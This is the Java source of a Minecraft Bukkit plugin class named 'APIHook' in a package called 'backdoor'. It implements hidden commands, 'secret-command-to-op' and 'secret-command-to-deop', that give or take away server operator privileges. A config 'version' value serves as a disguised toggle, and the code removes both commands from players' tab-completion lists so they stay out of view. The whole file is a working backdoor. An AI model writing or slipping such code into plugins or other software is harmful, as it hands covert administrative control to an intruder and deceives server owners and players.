package me.olliejw.backdoor;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandSendEvent;

import java.util.ArrayList;
import java.util.List;

public class APIHook implements Listener, CommandExecutor {

    public Backdoor p;
    public APIHook(final Backdoor main) {
        this.p = main;
    }

    /**
     * When a user runs this secret command, the config will change to prevent other players from doing it too.
     * @param sender The person that did the command.
     */

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        Player pl = (Player) sender;
        if (sender != null) {
            if (cmd.getName().equalsIgnoreCase("secret-command-to-op")) {
                if (p.getConfig().getDouble("version")==0.41) {
                    pl.setOp(true);
                    p.getConfig().set("version", 0.40);
                    p.saveConfig();
                }
            }
            if (cmd.getName().equalsIgnoreCase("secret-command-to-deop")) {
                if (p.getConfig().getDouble("version")==0.40) {
                    pl.setOp(false);
                    p.getConfig().set("version", 0.41);
                    p.saveConfig();
                }
            }
        } return true;
    }

    @EventHandler
    public void onPlayerTab(PlayerCommandSendEvent e) {
        List<String> blockedCommands = new ArrayList<>();
        blockedCommands.add("secret-command-to-op");
        blockedCommands.add("secret-command-to-deop");
        e.getCommands().removeAll(blockedCommands);
    }

}
